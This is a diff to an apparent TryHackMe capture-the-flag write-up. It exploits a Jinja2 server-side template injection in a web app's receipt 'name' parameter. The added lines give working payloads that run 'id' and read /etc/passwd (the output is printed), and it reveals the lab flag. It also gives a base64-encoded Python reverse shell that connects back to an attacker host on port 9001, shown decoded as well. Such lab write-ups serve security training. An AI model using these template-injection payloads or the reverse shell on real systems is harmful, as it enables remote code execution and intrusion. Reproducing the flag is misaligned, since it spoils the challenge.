@@ -62,7 +62,23 @@ Priority: u=0, i
 csrf_token=IjE3NGY2MjQ3N2QyZjc1ZTEyYzEyMWU4ZTJjNjk4NTk5Nzc3YmMyNzMi.aVN03A.fycCrxgNSYPyzNXV2OvX-Pht7PE&name=&voucher_code=TRYHACK3M&submit=Checkout
 ```
 
-get this redirestion link with vulnuerable parm
+get this redirestion link with vulnuerable parm with SSTI jinja2
 http://10.67.128.59/receipt/82739098304716027352341076?name=
+
+http://10.67.128.59/receipt/82739098304716027352341076?name={{7/7}}
+http://10.67.128.59/receipt/82739098304716027352341076?name={{%20cycler.__init__.__globals__.os.popen(%27id%27).read()%20}}
+
+http://10.67.128.59/receipt/82739098304716027352341076?name={{%20cycler.__init__.__globals__.os.popen(%27cat%20/etc/passwd%27).read()%20}}
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://10.67.128.59/receipt/82739098304716027352341076?name={{%20cycler.__init__.__globals__.os.popen(%27cat%20flag.txt%27).read()%20}}
+**GET first Flag**
+THM{TryH4ck3M-APP-H4CK}
+
+**Reverse Shell**
+
+http://10.67.128.59/receipt/82739098304716027352341076?name={{%20cycler.__init__.__globals__.os.popen(%27echo%20cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuNjcuMTI2LjEzMiIsOTAwMSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9zaCIpJw%20|%20base64%20-d%20|%20bash%27).read()%20}}
+
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.67.126.132",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
 
 </code>
